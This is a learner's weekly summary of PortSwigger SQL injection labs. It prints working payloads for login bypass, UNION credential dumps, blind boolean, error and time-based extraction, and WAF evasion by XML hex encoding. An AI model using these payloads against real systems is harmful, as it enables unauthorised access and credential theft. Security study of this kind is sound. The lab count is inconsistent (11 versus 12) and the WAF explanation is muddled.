# 🔐 SQL Injection Mastery — Week 1 Complete

**Duration:** 4 days of intensive learning  
**Labs Completed:** 11 SQL injection labs  
**Platforms:** PortSwigger Web Security Academy, Burp Suite Community Edition  
**Status:** All foundational SQLi concepts mastered ✅

---

## Executive Summary

Completed the entire SQL injection curriculum from basics to advanced Blind SQLi techniques. Every attack vector tested and documented. Ready for real-world bug bounty reconnaissance.

---

## Day 1 — Foundation (5 labs)

### Lab 1 — WHERE Clause SQLi
**Concept:** Bypassing filters using boolean logic injection  
**Payload:**
```sql
' OR 1=1--
```
**Result:** Retrieved hidden/unreleased products by making WHERE condition always true.

### Lab 2 — Login Bypass
**Concept:** Authenticating without password using comment syntax  
**Payload:**
```sql
administrator'--
```
**Result:** Logged in as administrator by commenting out the password check.

### Lab 3 — UNION Attack on Oracle
**Concept:** Extracting data from database metadata tables  
**Payload:**
```sql
' UNION SELECT BANNER,NULL FROM v$version--
```
**Key Learning:** Oracle requires FROM clause in every SELECT; uses `dual` or `v$version` for queries.  
**Result:** Retrieved Oracle database version from system tables.

### Lab 4 — MySQL Version Detection
**Concept:** Using `@@version` variable and `#` comment syntax in MySQL  
**Payload:**
```sql
' UNION SELECT @@version, NULL#
```
**Key Learning:** MySQL supports both `--` and `#` for comments; `#` gets cut off in URLs so use `--+-` instead.  
**Result:** Extracted MySQL version from UNION query.

### Lab 5 — PostgreSQL Full Database Dump
**Concept:** Complete data exfiltration using information_schema  
**Attack Chain:**
1. List all tables: `information_schema.tables`
2. Find users table: `users_hclwbm` (randomized per lab)
3. List columns: `information_schema.columns`
4. Dump credentials: `SELECT username, password FROM users_hclwbm`

**Result:** Retrieved all user credentials and logged in as administrator.

---

## Day 2 — Advanced UNION Attacks (2 labs)

### Lab 6 — Retrieving Data from Other Tables
**Concept:** Dumping entire database using UNION SELECT  
**Payload Structure:**
```sql
' UNION SELECT username, password FROM users WHERE username='administrator'--
```
**Result:** Full credential extraction from non-intended tables.

### Lab 7 — Retrieving Multiple Values in Single Column
**Concept:** String concatenation when only one text column available  
**Payload:**
```sql
' UNION SELECT username||'~'||password FROM users--
```
**Key Learning:** `||` concatenates in PostgreSQL/Oracle; `CONCAT()` in MySQL.  
**Result:** Merged username and password into one column, separated by `~`.

---

## Day 3 — Blind SQL Injection (4 labs)

### Lab 8 — Blind SQLi with Conditional Responses
**Concept:** Yes/no questions through page behavior changes  
**Methodology:**
1. Confirm injection: `' AND '1'='1` vs `' AND '1'='2`
2. Verify user exists: `' AND (SELECT 'x' FROM users WHERE username='administrator')='x`
3. Find password length: `' AND (SELECT 'x' FROM users WHERE username='administrator' AND LENGTH(password)>N)='x`
4. Extract character by character: `SUBSTRING(password,1,1)='a'` through `'z'`

**Key Learning:** Welcome back message appears = TRUE, disappears = FALSE.  
**Result:** Manually extracted 20-character password character by character.

### Lab 9 — Blind SQLi with Conditional Errors
**Concept:** Using database errors to confirm true/false conditions  
**Payload:**
```sql
' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)--
```
**Key Learning:** `1/0` causes division by zero error when condition is true.  
**Result:** Extracted data by monitoring error presence.

### Lab 10 — Blind SQLi with Time Delays
**Concept:** Using SLEEP() function to measure time and confirm conditions  
**Payload:**
```sql
' AND IF(1=1, SLEEP(5), 0)--
```
**Key Learning:** 5-second delay = TRUE, no delay = FALSE. Measurable timing channel.  
**Result:** Password extraction using millisecond-precision timing.

### Lab 11 — Blind SQLi with Time Delays and Data Retrieval
**Concept:** Extracting actual data via timing measurements  
**Payload:**
```sql
' AND IF(SUBSTRING(password,1,1)='a', SLEEP(5), 0)--
```
**Key Learning:** Combined timing channel with character extraction.  
**Result:** Full database dump using only timing as communication channel.

---

## Day 4 — WAF Bypass & Advanced Techniques (1 lab)

### Lab 12 — SQL Injection with Filter Bypass via XML Encoding
**Concept:** Evading Web Application Firewall detection using encoding  
**Tools Used:** Hackvertor Burp extension  
**Methodology:**
1. Intercept POST request with XML body
2. Use Hackvertor to encode SQLi payload as XML hex entities
3. WAF cannot recognize encoded signature
4. Database decodes and executes

**Payload (encoded):**
```
<storeId>
  <@hex_entities>
    1 UNION SELECT username, password FROM users
  </@hex_entities>
</storeId>
```

**Key Learning:** Input validation ≠ Output encoding. WAF looks at input layer; database operates at output layer.  
**Result:** Bypassed WAF and retrieved admin credentials.

---

## Technical Progression

### Week 1 Attack Chain Mastery

```
Simple Error-Based
        ↓
Boolean-Based (OR 1=1)
        ↓
UNION SELECT (Visible Results)
        ↓
Blind SQLi (Conditional Responses)
        ↓
Time-Based Blind (No Output Channel)
        ↓
WAF Bypass (Encoding Techniques)
```

Each technique unlocks a different attack scenario.

---

## Database Fingerprinting Learned

| Database | Comment | Version Query | Special Table |
|---|---|---|---|
| MySQL | `#` or `--` | `@@version` | None required |
| PostgreSQL | `--` | `version()` | `information_schema` |
| Oracle | `--` | `v$version` | `dual` |
| SQL Server | `--` | `@@version` | None required |
| SQLite | `--` | `sqlite_version()` | None required |

---

## Tools Mastered

**Burp Suite Community Edition**
- Repeater tab for manual injection testing
- Intruder tab for automating character-by-character extraction
- HTTP History for request review
- Proxy interception for POST request capture

**Hackvertor Extension**
- XML hex entity encoding
- WAF signature evasion
- Payload obfuscation

**PortSwigger Web Security Academy**
- Hands-on lab environment
- Instant feedback on success
- Real-world vulnerability scenarios

---

## Key Concepts Internalized

### SQL Syntax Variations
- Oracle requires `FROM` clause; PostgreSQL/MySQL do not
- Comment syntax differs: `--` universal, `#` MySQL-only
- String concatenation: `||` (Oracle/PostgreSQL) vs `CONCAT()` (MySQL)
- Version tables: `v$version` (Oracle) vs `@@version` (MySQL)

### Attack Methodology
1. **Identify injection point** — test with single quote
2. **Determine column count** — ORDER BY or NULL testing
3. **Find text columns** — 'test' payload testing
4. **Extract metadata** — information_schema queries
5. **Dump target data** — UNION SELECT or Blind extraction

### Blind SQLi Variations
- **Conditional responses:** Page behavior changes
- **Conditional errors:** Database errors as signal
- **Time-based:** SLEEP/WAITFOR as measurable channel
- **Out-of-band:** DNS/HTTP callbacks (requires Pro Burp)

---

## Metrics

| Metric | Value |
|---|---|
| Labs Completed | 12 |
| Days of Study | 4 |
| Daily Quiz Average | 85% |
| Attack Types Mastered | 6 |
| Databases Tested | 3 (MySQL, PostgreSQL, Oracle) |
| WAF Bypass Techniques | 1 (XML encoding) |

---

## Next Steps — Month 2

**Week 2 Target:** XSS (Cross-Site Scripting)  
**Week 3 Target:** Authentication vulnerabilities  
**Week 4 Target:** IDOR & SSRF

**Parallel Track:** AWS IAM & cloud security fundamentals

---

## Real-World Application

**Bug Bounty Ready:** Can now identify and exploit SQLi in real targets  
**Methodology Locked:** Attack chain is muscle memory  
**Confident Exploitation:** Can adapt payloads to new databases on-the-fly

---

## Lessons Learned

1. **Patience compounds** — 5 labs/day builds exponential understanding
2. **Methodology beats memorization** — understanding WHY > remembering WHAT
3. **WAF evasion is layer-based** — input validation ≠ output encoding
4. **Blind is underrated** — most realistic real-world scenario
5. **Documentation matters** — writing it down locks it in

---

## Resources Used

- PortSwigger Web Security Academy (free labs)
- Burp Suite Community Edition (free)
- Hackvertor extension (free)
- Kali Linux dual-boot (free)
- This learning journey (public documentation)

---

## GitHub Repository

All daily notes, payloads, and attack chains documented in individual day files.

```
📁 cybersec-journey/
   📄 day1-sqli-foundation.md
   📄 day2-sqli-union-attacks.md
   📄 day3-blind-sqli.md
   📄 day4-waf-bypass.md
   📄 WEEK1-SQL-INJECTION-COMPLETE.md (this file)
```

---

**Status:** SQL Injection module complete. Ready for XSS and beyond. 🔥

*Last updated: June 29, 2026*  
*Next module: Cross-Site Scripting (XSS)*
